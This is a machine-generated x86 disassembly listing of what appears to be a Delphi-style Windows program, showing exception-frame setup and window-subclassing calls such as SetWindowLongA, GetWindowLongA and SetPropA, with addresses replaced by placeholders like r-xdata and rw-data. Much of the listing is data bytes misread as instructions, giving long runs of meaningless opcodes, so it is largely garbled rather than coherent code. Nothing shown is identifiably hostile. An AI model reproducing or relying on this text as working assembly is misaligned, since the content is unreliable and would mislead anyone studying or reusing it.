je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_4035b4
call sub_405664
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_4386b0
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_4386dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43874a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438751
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_40564c
mov eax rw-data
call sub_40564c
mov eax rw-data
call sub_40564c
mov eax rw-data
call sub_403fe0
mov eax rw-data
call sub_40564c
mov eax [ rw-data ]
call sub_437d0c
sub_438754
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4387a6
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4387ad
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_438668
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_40564c
mov edx eax
mov eax [ rw-data ]
call sub_4249b0
sub_4387b0
mov ah 0x87
inc ebx
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
fdiv [ esi + 0x540b0043 ]
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc ebx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax * 8 - 0x78 ] si
inc ebx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 4 - 0x78 ] si
inc ebx
add ah dh
adc [ eax ] al
add [ eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
nop
rol [ edi + 0x7010043 ] 0x1
push esp
inc ebx
jne r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + ecx * 4 + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x88
inc ebx
add [ eax + eax ] dh
add [ eax ] al
mov al [ 0xffffffffd8004010 ]
jae r-xdata
add [ eax ] ah
mov al [ ebx ]
inc eax
add [ eax ] al
add ah ah
mov [ ebx ] al
fdiv [ eax + eax * 2 ]
inc esp
jb r-xdata
add al bl
mov dh 0x43
add [ eax + 0x480043b7 ] bl
mov bh 0x43
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
xor al 0x40
add [ eax ] bh
mov bh 0x43
add [ eax ] ch
mov bh 0x43
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x34004388 ] dh
add [ eax ] al
add [ eax - 0x27ffbff0 ] ah
jb r-xdata
inc ebx
inc ebx
outsd
outsb
je r-xdata
add [ eax ] bh
mov bh 0x43
add [ eax ] ch
add [ eax ] al
and [ edx + r--data ] cl
add [ eax ] al
in al 0x88
inc ebx
add al bl
xor al 0x40
inc ebx
outsd
outsb
je r-xdata
add [ eax ] ch
mov bh 0x43
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add ah al
mov bh 0x43
add [ esi + esi * 4 - 0x494fffbd ] dh
inc ebx
add [ ebp + esi * 4 - 0x4893ffbd ] dh
inc ebx
add [ eax - 0x4b ] bh
inc ebx
add ah cl
mov dh 0x43
add al dl
mov dh 0x43
add [ ebx + 0x438930c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 4 + 0x43 ] bl
add [ eax + eax ] bh
add [ eax ] al
inc eax
mov [ ebx ] al
fdiv [ eax + eax * 2 ]
add [ eax ] bh
mov bh 0x43
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
call 0x343cb70
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add ah ah
xchg [ ebx ] eax
push es
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc ebx
add [ edx + edi * 4 ] bh
inc ebx
add [ eax - 0x4bffbc4a ] dh
mov ch 0x43
add ah dh
mov eax 0xb5780043
inc ebx
add ah cl
inc ebx
outsd
outsb
je r-xdata
mov dh 0x43
add [ eax + edi * 4 ] bh
inc ebx
add [ eax + 0x480043b7 ] bl
mov bh 0x43
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
add [ eax ] dl
mov eax 0xb5b40043
inc ebx
add [ edi + esi * 4 + 0x43 ] ch
add [ eax - 0x4b ] bh
inc ebx
add [ eax + edi * 4 ] bl
inc ebx
add al dl
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x80 ] si
mov al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
mov al [ ebx ]
inc eax
add [ eax ] al
add [ eax - 0x27ffbc77 ] ch
xor al 0x40
add [ eax ] bh
mov bh 0x43
add [ eax + edi * 4 + 0x43 ] bl
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add ah al
mov bh 0x43
add al bh
mov bh 0x43
mov bh 0x43
add ah ch
xor al 0x40
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x78 ] si
mov [ ebx ] eax
pop es
push ss
push esp
inc edx
popad
jae r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
inc ebx
add al bl
xor al 0x40
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax - 0x75 ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + edx - 0x75 ] si
inc ebx
add [ ecx + ecx * 4 + 0x43 ] dh
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
mov dh 0x43
add al dl
mov dh 0x43
add al bl
mov dh 0x43
add [ eax - 0x47 ] dl
inc ebx
add [ eax - 0x48 ] ah
inc ebx
add [ eax + 0x140043b9 ] bl
mov edx 0xba280043
inc ebx
add [ eax - 0x46 ] cl
inc ebx
add [ edi ] cl
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
adc [ ebx + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
mov eax [ ebx ]
jo r-xdata
loopne r-xdata
inc esp
jb r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
xor al [ eax ]
xor [ edx ] 0x40
add [ eax - 0x4b ] dh
inc ebx
add [ esi + esi * 4 - 0x494fffbd ] dh
inc ebx
add [ ebp + esi * 4 - 0x4ae7ffbd ] dh
inc ebx
add [ eax - 0x4b ] bh
outsd
insd
inc ecx
add [ eax ] dh
inc eax
inc ecx
add ah bl
fadd [ ecx ]
enter 0x41d8 0x0
dec esp
int3
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
jo r-xdata
add al bl
mov dh 0x43
add [ eax - 0x47 ] dl
inc ebx
add [ eax - 0x48 ] ah
inc ebx
add [ eax + 0x140043b9 ] bl
mov edx 0xba280043
inc ebx
add [ eax - 0x46 ] cl
inc ebx
add [ ecx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
in al 0x88
inc ebx
add al bl
xor al 0x40
add [ eax ] bh
mov bh 0x43
add [ eax ] ch
mov bh 0x43
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
les edi [ eax - 0x483bffbd ]
add [ edx ] dl
push esp
inc esp
jb r-xdata
inc ebx
add [ eax - 0x49 ] cl
inc ebx
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add ah al
mov bh 0x43
add al bh
mov bh 0x43
inc eax
add al ah
xor al 0x40
inc ebx
outsd
outsb
je r-xdata
int3
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 4 + 0x43 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx + eax * 2 + 0x6400 ] cl
add al bh
mov cl 0x41
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
and ah cl
inc ebx
add [ ecx + eax * 2 ] dl
inc ecx
add [ ecx + eax * 2 ] bl
add [ ebx + 0x438bd4c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
mov [ ebx ] es
jo r-xdata
add [ eax ] dl
mov eax 0xb5b40043
inc ebx
add [ edi + esi * 4 + 0x43 ] ch
add [ eax - 0x4b ] bh
inc ebx
add [ eax + edi * 4 ] bl
inc ebx
add al dl
mov dh 0x43
inc ebx
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + esi - 0x77 ] si
inc ebx
add [ eax + ecx * 4 + 0x43 ] bh
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc ebx
add ah cl
mov dh 0x43
add al dl
mov dh 0x43
add al bl
mov dh 0x43
add [ ebx ] cl
push esp
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
add [ eax ] bh
mov bh 0x43
add [ eax - 0x46 ] dl
inc ebx
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
les edi [ eax - 0x483bffbd ]
inc ebx
add [ edx + edi * 4 ] bh
inc ebx
add [ eax - 0x4bffbc4a ] dh
mov ch 0x43
add ah dh
mov eax 0xb5780043
inc ebx
add ah cl
mov dh 0x43
add al dl
mov dh 0x43
add [ eax ] al
les ecx [ edx + 0x34d80043 ]
inc eax
add [ eax + edi * 4 ] bh
inc ebx
add [ eax + 0x480043b7 ] bl
mov bh 0x43
inc ebx
outsd
insb
jae r-xdata
add [ ebp - 0x760bffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_439c08
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_439ea3
shr [ eax + 0xf00439e ] 0xc
dec ecx
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
or [ ebx + 0x6f ] al
outsb
je r-xdata
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
add [ eax + ebx * 4 - 0x676bffbf ] bl
inc ecx
add [ ebx + ebx * 4 + 0x6940041 ] bh
inc esp
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
outsd
insb
jae r-xdata
inc esp
add [ ebx + 0x497c0044 ] al
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
add [ eax ] al
add [ eax ] al
in al dx
lahf
inc ebx
add [ eax + 0x43a2 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
mov al [ 0xffffffffa27e0043 ]
inc ebx
add [ edx + eax ] al
add [ eax ] al
hlt
add bh bh
jmp [ edi + ebx * 4 ]
add al 0x44
add [ edi + eax * 2 + 0x48580044 ] bl
inc ebx
add [ eax + 0x69000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
inc esp
add [ edi + 0x44 ] cl
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esi + ebx * 4 + 0x17c0043 ] ah
add [ eax ] al
je r-xdata
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x8 ] al
push ds
inc esp
add ah dh
pop ss
inc esp
add al dh
sbb al [ eax + eax + 0x20 ]
sbb [ eax + eax - 0x60 ] eax
push ds
inc esp
add [ esi + ebx + 0x1d5c0044 ] ah
add [ ebx + 0x44 ] bh
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
sub_439edc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
lahf
inc ebx
add [ eax + 0x43a2 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
mov al [ 0xffffffffa27e0043 ]
inc ebx
add [ edx + eax ] al
add [ eax ] al
hlt
sub_43a99c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xa9
inc ebx
add [ eax ] ch
add [ eax ] al
add [ eax - 0x27ffbff0 ] ah
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_43aa8c
insb
stosb [ edi ]
inc ebx
add [ esi - 0x56 ] dh
inc ebx
add [ eax - 0xeffbc56 ] al
test eax 0xa9f90043
inc ebx
add [ ecx ] al
stosb [ edi ]
inc ebx
add [ ecx ] cl
stosb [ edi ]
inc ebx
add [ esi ] dl
stosb [ edi ]
inc ebx
add [ ebx ] ah
stosb [ edi ]
inc ebx
add [ eax ] dh
stosb [ edi ]
inc ebx
add [ 0x4a0043aa ] bh
stosb [ edi ]
inc ebx
add [ edi - 0x56 ] dl
inc ebx
add [ edx + ebp * 4 + 0x43 ] ah
add [ ecx ] al
add [ eax ] al
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0xffffffffaa8ce870 ] eax
inc ebx
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] dh
stosd [ edi ]
inc ebx
add ah al
stosb [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 4 + 0x43 ] bl
add [ eax ] bh
add [ eax ] al
xchg esp eax
adc [ eax ] eax
fdiv [ eax + eax * 2 ]
add ah cl
push esi
inc eax
add al bl
push esi
inc eax
add ah ch
xor al 0x40
add al ah
xor al 0x40
add al ch
push esi
inc eax
add [ edx + esi + 0x40 ] al
add [ edi + ebp * 2 + 0x6fe00044 ] cl
inc esp
add [ eax + 0x71 ] bl
inc esp
add [ eax + 0x71 ] ch
inc esp
add [ eax ] ch
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
jl r-xdata
cwde
inc ecx
add [ ebx + ebx * 4 + 0x6940041 ] bh
inc esp
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
nop
or [ ebx + eax * 2 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
lodsd [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
add [ ebx + ebp * 4 + 0x280043 ] dh
add [ eax ] al
mov al [ 0xffffffffd8004010 ]
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x7e ] dl
inc esp
add [ eax + eax * 4 + 0x44 ] dl
add [ eax - 0x7b ] bl
inc esp
add [ ebx + eax * 4 ] cl
inc esp
add [ esi + ebp * 2 ] ah
inc esp
add ah ch
jl r-xdata
inc esp
add [ ebx + 0x497c0044 ] al
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
inc eax
xchg edx eax
inc esp
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
je r-xdata
inc esp
add [ edi + 0x44 ] cl
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add [ eax - 0x67ffbfd6 ] bl
sub al [ eax ]
cwde
sub al [ eax ]
cwde
sub al [ eax ]
cwde
sub al [ eax ]
cwde
sub al [ eax ]
cwde
sub al [ eax ]
cwde
sub al [ eax ]
push eax
cdq
inc esp
add [ eax + 0x1200402a ] bl
push esp
inc ebx
jne r-xdata
add [ ebx + 0x44 ] bh
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x8 ] al
push ds
inc esp
add ah dh
pop ss
inc esp
add al dh
sbb al [ eax + eax + 0x20 ]
sbb [ eax + eax - 0x60 ] eax
push ds
inc esp
add [ esi + ebx + 0x1d5c0044 ] ah
lodsb [ esi ]
inc ebx
add [ eax ] cl
add al [ eax ]
add al bl
sahf
inc ebx
add [ ebx + ebx * 4 + 0x34e40041 ] bl
inc eax
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add al ah
and al 0x44
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov eax 0x80004407
push esp
inc esp
add [ eax + 0x3000441c ] ch
inc eax
inc ecx
add [ edx + eax ] bh
inc esp
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ esi + eax + 0x4f940044 ] dl
inc esp
add [ eax - 0x3ffbbac ] dh
add [ eax ] al
adc [ ebp + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
mov eax eax
mov ah 0xab
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
inc esp
add [ ebx + 0x497c0044 ] al
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
and al 0x44
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov eax 0x80004407
insb
nop
adc [ ebp + 0x12070043 ] ch
push esp
inc ebx
jne r-xdata
sub eax [ edi ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
insd
dec ebp
jne r-xdata
inc esp
add [ edi + 0x44 ] cl
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add [ eax - 0x67ffbfd6 ] bl
sub al [ eax ]
cwde
sub al [ eax ]
cwde
sub al [ eax ]
cwde
sub al [ eax ]
cwde
sub al [ eax ]
cwde
sub al [ eax ]
cwde
sub al [ eax ]
push eax
cdq
inc esp
add [ eax - 0x67ffbfd6 ] bl
sub al [ eax ]
cwde
sub al [ eax ]
sbb eax 0x73754354
je r-xdata
add [ ebx + 0x44 ] bh
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x8 ] al
push ds
inc esp
add ah dh
pop ss
inc esp
add al dh
sbb al [ eax + eax + 0x20 ]
sbb [ eax + eax - 0x60 ] eax
push ds
inc esp
add [ esi + ebx + 0x1d5c0044 ] ah
push esp
inc esp
add [ eax + 0x3000441c ] ch
je r-xdata
mov eax [ rw-data ]
push 0xfffffff4
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18c ]
inc edi
add [ ebx - 0x6f76f7ab ] cl
add [ ecx ] 0x0
add [ ecx + rw-data ] ah
je r-xdata
inc eax
add [ eax - 0x57ffbbac ] al
sbb al 0x44
add [ eax ] dh
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push ebx
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
jae r-xdata
inc ecx
add [ edx + eax ] bh
inc esp
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ esi + eax + 0x4f940044 ] dl
inc esp
add [ eax - 0x3ffbbac ] dh
insb
or [ ebx + eax * 2 + 0x43a28c00 ] ch
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
push eax
add [ eax ] al
inc ebx
outsd
outsb
je r-xdata
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
inc ecx
add [ eax + ebx * 4 - 0x676bffbf ] bl
inc ecx
add [ ebx + ebx * 4 + 0x6940041 ] bh
inc esp
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
outsd
insb
jae r-xdata
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
outsd
insb
mov eax eax
movsb [ edi ] [ esi ]
scasb [ edi ]
inc ebx
add [ edi ] al
sbb eax 0x73754354
je r-xdata
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add al ah
add [ ebp - 0x5277ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 4 + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ esi + 0x20c0043 ] 0x0
add [ ebx + ebp * 4 - 0x6463ffbd ] bh
inc ecx
add ah ah
xor al 0x40
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
insd
dec ebp
jne r-xdata
inc ebp
or [ eax - 0x18 ] dl
mov ah 0xb7
cld
[ ecx + 0x40000000 ]
je r-xdata
push ebx
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
jae r-xdata
push eax
call GetWindowLongA
test eax eax
jne r-xdata
inc ebx
outsd
outsb
je r-xdata
mov bh 0xfc
inc [ ebp - 0x74f08a40 ]
inc ebp
or [ eax + 0x6a ] dl
hlt
outsd
insb
mov [ ebp - 0x52f3ffbd ] ch
inc ebx
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
cmpsd [ esi ] [ edi ]
mov ecx 0x8a1fffc
sub eax [ edi ]
outsd
insb
jae r-xdata
add [ edx + 0x1ea8010 ] cl
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_43aeec
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
